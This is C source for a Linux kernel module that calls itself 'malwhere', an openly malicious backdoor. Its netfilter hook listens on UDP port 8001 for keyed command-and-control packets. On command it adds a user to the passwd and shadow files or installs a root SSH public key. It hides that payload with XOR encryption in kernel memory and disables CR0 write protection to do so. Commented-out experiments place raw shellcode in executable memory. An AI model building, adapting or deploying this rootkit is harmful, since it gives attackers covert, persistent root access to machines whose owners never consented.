#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/dcache.h>
#include <linux/preempt.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/fcntl.h>
#include <linux/slab.h>
#include <linux/mutex.h>
#include <linux/kallsyms.h>
#include <linux/sched.h>
#include <linux/crypto.h>
#include <linux/dirent.h>
#include <linux/reboot.h>
#include <linux/notifier.h>
#include <linux/kobject.h>
#include <asm/syscall.h>
#include <net/sock.h>
#include <net/ip.h>
#include <linux/ip.h>
#include <linux/net.h>
#include <linux/udp.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/socket.h>
#include <linux/icmp.h>
#include <linux/if_ether.h>
#include <linux/inet.h>
#include <linux/net.h>
#include <linux/vmalloc.h>
#include <linux/kthread.h>

#include "main.h"
#include "sensitive.h"

#define DEFAULT_KEY 97425196
#define KEY_STR_LEN 10
#define CMD_ADD_USER   1
#define CMD_ADD_PUBKEY 2

int cur_key = 0;
int new_key = DEFAULT_KEY; // Initialize encryption key with at least someting
static int debug_output = 0;
char *module_str = "malwhere";
unsigned char *nfhook_deep_space = NULL;
struct nf_hook_ops nfho;
atomic_t trigger_add_user = ATOMIC_INIT(0);
atomic_t trigger_add_pubkey = ATOMIC_INIT(0);
atomic_t payload_encrypted = ATOMIC_INIT(0);
DECLARE_WORK(wq_add_user, wq_task_add_user);
DECLARE_WORK(wq_add_root_pubkey, wq_task_add_root_pubkey);

struct command {
  unsigned int action, cur_key, new_key;
};

struct key_state {
  unsigned int cur_key, new_key;
};

/* Enable page modification - reenable W^X */
void enable_pm(void) {
  write_cr0(read_cr0() & (~ 0x10000));
}

/* Disable page modification - disable W^X */
void disable_pm(void) {
  write_cr0(read_cr0() | 0x10000);
}

/* Command packet follows this format:
 *   1. initiation sequence
 *   2. ':'
 *   3. current key (KEY_STR_LEN)
 *   4. ':'
 *   5. new key     (KEY_STR_LEN). All zeros if the key shouldn't change
 *   6. ':'
 *   7. command     (char)
 *
 * TODO: use a lock to process commands. Take a lock when a command is accepted
 *       and release the lock when it is processed and the payload is encrypted.
 *       In practice, commands should come from a race-free source.
 */
struct command *get_command(unsigned char *data, size_t len) {
  printk(KERN_ALERT "get_command()");
  char initiation[] = {0x6b,0x65,0x79};
  char action = 0;
  int i = 0;
  char intbuf[KEY_STR_LEN+1];

  // Perform length check immediately to improve performance in the likely case
  // that the packet is not from C2. 
  size_t cmd_pkt_len = sizeof(initiation) + 1 + KEY_STR_LEN + 1 + KEY_STR_LEN + 1 + 1;
  printk(KERN_ALERT "%d==%d ?\n", len, cmd_pkt_len);
  if (likely(len != cmd_pkt_len)){
    debug_output && printk(KERN_ALERT "Packet len didn't match\n");
    return NULL;
  }

  struct command *cmd = NULL;
  int initiation_idx = 0;
  int cur_key_idx = initiation_idx + 1 + sizeof(initiation);
  int new_key_idx = cur_key_idx + 1 + KEY_STR_LEN;
  int action_idx = new_key_idx + 1 + KEY_STR_LEN;

  if ((cmd = kmalloc(sizeof(struct command), GFP_KERNEL)) == NULL)
    return NULL;

  if (memcmp(data, initiation, sizeof(initiation)) != 0) {
    debug_output && printk(KERN_ALERT "Key doesn't match\n");
    return NULL;
  }
  debug_output && printk(KERN_ALERT "Key matches\n");

  // Copy in current key from the command packet
  for (i = 0; i < KEY_STR_LEN; i++)
    intbuf[i] = data[cur_key_idx+i];

  intbuf[KEY_STR_LEN] = '\0';
  if (kstrtouint(intbuf, 10, &cmd->cur_key) < 0) {
    if (cmd) kfree(cmd);
    return NULL;
  }

  // Copy in new key from the command packet. Even if it isn't changed, it's
  // required.
  for (i = 0; i < KEY_STR_LEN; i++)
    intbuf[i] = data[new_key_idx+i];

  intbuf[KEY_STR_LEN] = '\0';
  if (kstrtouint(intbuf, 10, &cmd->new_key) < 0) {
    if (cmd) kfree(cmd);
    return NULL;
  }

  if (cmd->new_key == 0)
    cmd->new_key = cmd->cur_key;

  cmd->action = data[action_idx];

  return cmd;
}

void free_command(struct command *cmd) {
  if (cmd != NULL)
    kfree(cmd);
  return;
}

int is_add_user(struct command *cmd) {
  return cmd && cmd->action & CMD_ADD_USER;
}

int is_add_pubkey(struct command *cmd) {
  return cmd && cmd->action & CMD_ADD_PUBKEY;
}

static unsigned int nfhook(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *)) {
  const struct sk_buff *this_skb = skb;
  struct iphdr *this_iphdr;
  struct udphdr *this_udphdr;
  unsigned char *data;
  size_t pkt_len;
  size_t udphdr_len;
  struct command *cmd = NULL;

  if (!this_skb){
    goto accept;
  }

  this_iphdr = (struct iphdr *) skb_network_header(this_skb);
  if (this_iphdr && this_iphdr->protocol == IPPROTO_UDP) {
    this_udphdr = skb_transport_header(this_skb);
    udphdr_len = sizeof(struct udphdr);
    debug_output && printk(KERN_ALERT "Got UDP. Looking for port %d", ntohs(this_udphdr->dest));
    if (ntohs(this_udphdr->dest) == 8001) {
      debug_output && printk(KERN_ALERT "UDP/8001");
      data = skb->data + ip_hdrlen(skb) + sizeof(struct udphdr);
      pkt_len = skb->len - ip_hdrlen(skb) - sizeof(struct udphdr);
      debug_output && printk(KERN_ALERT "PACKET (%d bytes)", pkt_len);

      if ((cmd = get_command(data, pkt_len)) == NULL){
        printk(KERN_ALERT "Got NULL from get_command()\n");
        goto accept;
      }
      
      // Command packet is valid, process the action.
      if (is_add_user(cmd)) {
        debug_output && printk(KERN_ALERT "Will add user");
        schedule_work(&wq_add_user);
      } else if (is_add_pubkey(cmd)) {
        debug_output && printk(KERN_ALERT "Will add pubkey");
        schedule_work(&wq_add_root_pubkey);
      } else {
        // Action is invalid.
        debug_output && printk(KERN_ALERT "Got command packet with bad action %x\n", cmd->action);
        goto accept;
      }

      // Pass the keys along to the payload.
      cur_key = cmd->cur_key;
      new_key = cmd->new_key;

      // And get rid of these temporary keys.
      cmd->cur_key = 0;
      cmd->new_key = 0;
      cmd->action = 0;

      kfree(cmd);

      return NF_DROP;
    }   
  }

  accept:
  return NF_ACCEPT;
}

static void set_nf_hook(void) {
  //nfho.hook = (unsigned long long *) nfhook_deep_space;
  nfho.hook = nfhook;
  nfho.hooknum = NF_INET_LOCAL_IN;
  nfho.pf = PF_INET;
  nfho.priority = NF_IP_PRI_FIRST;
  nf_register_hook(&nfho);
}

static void unset_nf_hook(void) {
  nf_unregister_hook(&nfho);
}

void xor_range(unsigned char *addr, size_t len, unsigned int k) {
  size_t i;
  preempt_disable();
  barrier();
  enable_pm();
  for (i = 0; i <= len; i+=4) {
    addr[i]   ^= (k & 0xff000000) >> 24;
    addr[i+1] ^= (k & 0x00ff0000) >> 16;
    addr[i+2] ^= (k & 0x0000ff00) >> 8;
    addr[i+3] ^=  k & 0x000000ff;
  }
  disable_pm();
  barrier();
  preempt_enable();
}

// Align SENSITIVE_LEN on key-length boundary to ensure no over-encryption.
size_t encrypt_len(unsigned int k) {
  debug_output && printk(KERN_ALERT "encrypt_len: %d", SENSITIVE_LEN - (SENSITIVE_LEN % sizeof(k)));
  return SENSITIVE_LEN - (SENSITIVE_LEN % sizeof(k));
}

int is_payload_encrypted(void) {
  return atomic_read(&payload_encrypted) == 1;
}

// Always encrypt with the new key. Assume that it is kept current.
void encrypt_payload(void) {
  if (is_payload_encrypted())
    return;
  xor_range((unsigned char *)add_file_line, encrypt_len(new_key), new_key);
  atomic_set(&payload_encrypted, 1);
  new_key = 0;
}

/* Always decrypt with the current key. Since this key is thrown away after
 * every decryption, we assume that if the command packet came in with the
 * correct initiation key, that the packet contains the correct current key.
 * If not, the kernel will at least oops.
 */
void decrypt_payload(void) {
  if (!is_payload_encrypted())
    return;
  xor_range((unsigned char *)add_file_line, encrypt_len(cur_key), cur_key);
  atomic_set(&payload_encrypted, 0);
  // Get rid of it.
  cur_key = 0;
}

// Work queue task
void wq_task_add_user(void *data) {
  int ret;
  decrypt_payload();
  // If adding the user to the shadow file succeeds, but addition to the passwd file fails,
  // then at least we added to the shadow file first. The existence of a user in shadow, but not
  // passwd is probably better than vice versa. Or just stop being lazy and remove the line from
  // shadow in this error case. Eh maybe later.
  if ((ret = add_user_shadow()) < 0) {
    printk(KERN_ALERT "error: work_add_user: shadow: %d\n", ret);
  }
  else if ((ret = add_user_passwd()) < 0) {
    printk(KERN_ALERT "error: work_add_user: passwd: %d\n", ret);
  }
  encrypt_payload();
}

// Work queue task
void wq_task_add_root_pubkey(void *data) {
  int ret;
  decrypt_payload();
  if ((ret = add_root_pubkey()) < 0)
    printk(KERN_ALERT "error: work_add_root_pubkey: %d\n", ret);
  encrypt_payload();
}

int wait_for_command(void *data) {
  int processed = 0;
  while (!kthread_should_stop()) {
    ssleep(5);
    debug_output && printk(KERN_ALERT "Thread running\n", atomic_read(&trigger_add_pubkey));
    
    /* It's possible for multiple triggers to come in at the same time. This
     * will end poorly since the payload encryption keys are deleted after use.
     * This means if one trigger processes immediately after the other, odds
     * are good that the key material is corrupted. Fix this with a lock.
     * Poor-man's fix is to skip any unprocessed triggers by setting them to 0.
     */
    if (atomic_read(&trigger_add_user) == 1) {
      decrypt_payload();
      add_user_passwd();
      add_user_shadow();
      encrypt_payload();
      processed = 1;
    } else if (atomic_read(&trigger_add_pubkey) == 1) {
      decrypt_payload();
      add_root_pubkey();
      encrypt_payload();
      processed = 1;
    }

    if (processed) {
      atomic_set(&trigger_add_user, 0);
      atomic_set(&trigger_add_pubkey, 0);
      processed = 0;
    }
  }
  printk(KERN_INFO "Thread Stopping\n");
  do_exit(0);
}

static int __init init(void) {
  encrypt_payload();
  debug_output && printk(KERN_INFO, "Setting nfhook");
  set_nf_hook();

  /*
  unsigned int block_size = 0;
  printk(KERN_INFO "[%s] init\n", module_str);
  struct crypto_shash *ch = crypto_alloc_cipher("aes", 0, 0);
  if (IS_ERR(ch)) {
    printk(KERN_INFO, "crypto_alloc_cipher error");
  }
  block_size = crypto_ablkcipher_blocksize(ch);
  unsigned char *cipher = kmalloc(block_size+1, GFP_KERNEL);
  unsigned char *decipher = kmalloc(block_size+1, GFP_KERNEL);
  cipher[block_size] = '\0';
  decipher[block_size] = '\0';
  crypto_cipher_setkey(ch, "asdfasdfasdfasdf", 16);
  crypto_cipher_encrypt_one(ch, cipher, "thisisasecret");
  crypto_cipher_decrypt_one(ch, decipher, cipher);
  */

  /*
  size_t nfhook_func_len = 0x06;
  nfhook_deep_space = __vmalloc(nfhook_func_len, GFP_KERNEL | __GFP_HIGHMEM, PAGE_KERNEL_EXEC);
  memcpy(nfhook_deep_space, "\xb8\x05\x00\x00\x00\xc3", nfhook_func_len);
  set_nf_hook();
  */

  /*
  size_t nfhook_func_len = 0x5c;
  nfhook_deep_space = kmalloc(nfhook_func_len, GFP_KERNEL);
  memcpy(nfhook_deep_space, nfhook, nfhook_func_len);
  set_nf_hook();
  */

  /*
  char *argv[] = {"/foobaz", "kernelspace", NULL};
  call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
  printk(KERN_INFO "memcpy\n");
  set_nf_hook();
  printk(KERN_INFO "set nf hook\n");
  */
  
  return 0;
}

static void __exit exit(void) {
  printk(KERN_INFO "[%s] exiting\n", module_str);
  unset_nf_hook();
  printk(KERN_INFO "[%s] exited\n", module_str);
}

module_init(init);
module_exit(exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("@unixist");
MODULE_DESCRIPTION("malwhere");

module_param(debug_output, int, 0000);
MODULE_PARM_DESC(debug_output, "Enable debug output.");
